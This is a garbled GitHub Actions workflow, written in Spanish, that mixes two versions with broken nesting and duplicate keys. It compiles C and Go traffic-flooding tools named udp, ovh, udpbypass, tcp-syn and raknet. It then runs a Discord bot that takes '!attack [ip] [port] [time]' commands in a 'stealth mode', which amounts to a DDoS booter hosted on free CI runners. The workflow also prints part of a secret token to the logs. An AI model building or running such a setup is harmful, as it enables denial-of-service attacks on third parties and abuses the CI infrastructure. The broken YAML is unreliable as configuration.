name: üöÄ Bot Exp
name: Botsito

on:
  workflow_dispatch:
  push:
    branches: [main]
    branches:
      - main

jobs:
  deploy-bot-continuous:
  build-and-run:
    runs-on: ubuntu-latest
    
    steps:
    - name: üì• Usar c√≥digo actual
      uses: actions/checkout@v4
    
    - name: üêç Configurar Python 3.11
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
    
    - name: ü¶æ Configurar Go 1.21
      uses: actions/setup-go@v4
      with:
        go-version: '1.21'
    
    - name: üîß Instalar herramientas de compilaci√≥n
      run: |
        sudo apt-get update
        sudo apt-get install -y build-essential gcc g++ make libpcap-dev
    
    - name: üì¶ Instalar discord.py
      run: |
        python -m pip install --upgrade pip
        pip install discord.py
    
    - name: üìö Configurar Go modules
      run: |
        if [ ! -f "go.mod" ]; then
          go mod init bot-udps 2>/dev/null || true
        fi
        go get github.com/sandertv/go-raknet 2>/dev/null || true
    
    - name: üõ†Ô∏è Compilar binarios C
      run: |
        echo "=== COMPILANDO BINARIOS ==="
        
        # Compilar todos los .c que existan
        for c_file in *.c; do
          if [ -f "$c_file" ]; then
            binary="${c_file%.c}"
            echo "Compilando $c_file ‚Üí $binary"
            gcc -O3 -pthread "$c_file" -o "$binary" 2>/dev/null || echo "  Error con $c_file"
            
            if [ -f "$binary" ]; then
              chmod +x "$binary"
              echo "  ‚úì $binary listo"
      - name: Checkout repository
        uses: actions/checkout@v4
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      - name: Set up Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.21'
      - name: Install Go dependencies
        run: |
          go mod init bot 2>/dev/null || true
          go get github.com/sandertv/go-raknet 2>/dev/null || true
          go get github.com/sirupsen/logrus 2>/dev/null || true
      - name: Install Python dependencies
        run: |
          python -m pip install --upgrade pip
          pip install discord.py
      - name: Install build tools
        run: |
          sudo apt-get update
          sudo apt-get install -y build-essential gcc g++ make libpcap-dev libssl-dev wget
      - name: Build binaries
        run: |
          echo "=== COMPILANDO BINARIOS ==="
          # Compilar m√©todos principales
          binaries=(
            "udp.c:udp"
            "udphex.c:udphex"
            "udppps.c:udppps"
            "ovh.c:ovh:-lpcap"
            "udppayload.c:udppayload"
            "udpbypass.c:udpbypass"
            "tcp.c:tcp" # Corrected compilation command
            "httpsrequest.c:httpsrequest"
            "tcp-syn.c:tcp-syn:-lpthread"  # tcp-syn multi-thread
          )
          for entry in "${binaries[@]}"; do
            IFS=':' read -r source binary libs <<< "$entry"
            if [ -f "$source" ]; then
              echo -n "üî® $source ‚Üí $binary ... "
              if [ -n "$libs" ]; then
                gcc -O3 -pthread "$source" -o "$binary" $libs 2>/dev/null && {
                  chmod +x "$binary"
                  echo "‚úÖ"
                } || echo "‚ö†Ô∏è"
              else
                gcc -O3 "$source" -o "$binary" 2>/dev/null && {
                  chmod +x "$binary"
                  echo "‚úÖ"
                } || echo "‚ö†Ô∏è"
              fi
            fi
          done
          echo ""
          echo "üìÇ Ejecutables disponibles:"
          ls -la | grep -E '^-..x.*' | awk '{print $9}' || echo "No hay ejecutables"
      - name: Prepare environment for https-request
        run: |
          echo "=== Preparando entorno para https-request ==="
          sudo python3 install.py
      - name: üöÄ EJECUTAR BOT CON KEYS
        env:
          KEYS: ${{ secrets.KEYS }}  # ¬°IMPORTANTE! Esto pasa KEYS al bot.py
        run: |
          echo "========================================"
          echo "ü§ñ INICIANDO BOT UDP/TCP/AMP/L7"
          echo "========================================"
          # DEBUG: Verificar que KEYS se recibi√≥
          echo "üîç VERIFICANDO CONFIGURACI√ìN:"
          echo "   - Directorio: $(pwd)"
          echo "   - Archivo bot.py: $(ls -la bot.py 2>/dev/null && echo "‚úÖ" || echo "‚ùå")"
          echo "   - KEYS recibido: $([ -n "$KEYS" ] && echo "‚úÖ (${#KEYS} chars)" || echo "‚ùå VAC√çO")"
          if [ -z "$KEYS" ]; then
            echo ""
            echo "‚ùå‚ùå‚ùå ERROR: KEYS est√° VAC√çO ‚ùå‚ùå‚ùå"
            echo ""
            echo "SOLUCI√ìN INMEDIATA:"
            echo "1. El secret 'KEYS' NO est√° configurado o est√° vac√≠o"
            echo "2. Ve a: Settings ‚Üí Secrets and variables ‚Üí Actions"
            echo "3. Haz clic en 'KEYS' para verificar su contenido"
            echo "4. Si est√° vac√≠o, ed√≠talo y pega tu token"
            echo ""
            echo "Token de Discord debe tener ~59 caracteres como:"
            echo "pito"
            exit 1
          fi
          # Verificar formato del token
          if [ ${#KEYS} -lt 50 ]; then
            echo "‚ö†Ô∏è  ADVERTENCIA: Token muy corto (${#KEYS} chars)"
            echo "   Debe tener ~59 caracteres m√≠nimo"
          fi
        done
        
        echo "Binarios disponibles:"
        find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" | xargs -I {} basename {} 2>/dev/null || echo "Ninguno"
    
    - name: üîê Configurar token desde secret KEYS
      env:
        DISCORD_TOKEN: ${{ secrets.KEYS }}
      run: |
        if [ -z "$DISCORD_TOKEN" ]; then
          echo "ERROR: Secret 'KEYS' no configurado"
          echo "Config√∫ralo en: Settings ‚Üí Secrets ‚Üí Actions ‚Üí KEYS"
          exit 1
        fi
        
        echo "$DISCORD_TOKEN" > token.txt
        echo "Token guardado en token.txt ($(wc -c < token.txt) caracteres)"
    
    - name: üöÄ Ejecutar bot CONTINUAMENTE
      run: |
        echo "========================================"
        echo "INICIANDO BOT EN MODO CONTINUO"
        echo "========================================"
        echo "El bot se ejecutar√° hasta que:"
        echo "1. GitHub detenga el runner (‚âà6 horas)"
        echo "2. Ocurra un error cr√≠tico"
        echo "3. Se cancele manualmente"
        echo "========================================"
        echo ""
        echo "M√âTODOS DISPONIBLES:"
        echo "!attack udp [ip] [puerto] [tiempo]"
        echo "!attack udphex [ip] [puerto] [tiempo]"
        echo "!attack udppps [ip] [puerto] [tiempo]"
        echo "!attack ovh [ip] [puerto] [tiempo]"
        echo "!attack raknet [ip] [puerto] [tiempo]"
        echo "!attack udpflood [ip] [puerto] [tiempo]"
        echo "!attack udppayload [ip] [puerto] [tiempo] [payload]"
        echo ""
        echo "‚ö†Ô∏è  MODO SIGILOSO: 0 mensajes en Discord"
        echo "üìù Logs solo en esta consola"
        echo "========================================"
        
        # Verificar archivos esenciales
        if [ ! -f "bot.py" ]; then
          echo "ERROR: bot.py no encontrado"
          exit 1
        fi
        
        if [ ! -f "token.txt" ] || [ ! -s "token.txt" ]; then
          echo "ERROR: token.txt no v√°lido"
          exit 1
        fi
        
        echo ""
        echo "‚úÖ INICIANDO EJECUCI√ìN CONTINUA..."
        echo "Hora de inicio: $(date)"
        echo "El bot permanecer√° activo hasta que GitHub lo detenga."
        echo ""
        
        # Ejecutar bot INDEFINIDAMENTE (sin timeout)
        python3 bot.py
        
        # Esto solo se ejecutar√° si el bot se detiene por error
        echo ""
        echo "========================================"
        echo "BOT DETENIDO"
        echo "Hora de finalizaci√≥n: $(date)"
        echo "C√≥digo de salida: $?"
        echo "========================================"
          echo ""
          echo "‚úÖ CONFIGURACI√ìN CORRECTA"
          echo "   Token recibido: ${#KEYS} caracteres"
          echo "   Vista previa: ${KEYS:0:15}..."
          echo ""
          echo "üéÆ M√âTODOS DISPONIBLES:"
          # Mostrar m√©todos seg√∫n ejecutables
          for method in udp udphex udppps ovh udppayload udpbypass tcp tcp-syn httpsrequest; do
            [ -f "$method" ] && echo "   ‚Ä¢ $method"
          done
          [ -f "udpflood.go" ] && echo "   ‚Ä¢ udpflood (Go)"
          [ -f "raknet.go" ] && echo "   ‚Ä¢ raknet (Go)"
          echo ""
          echo "üöÄ INICIANDO bot.py..."
          echo "========================================"
          # Ejecutar bot.py (KEYS ya est√° como variable de entorno)
          python3 bot.py
          echo ""
          echo "========================================"
          echo "ü§ñ BOT FINALIZADO"
          echo "========================================"
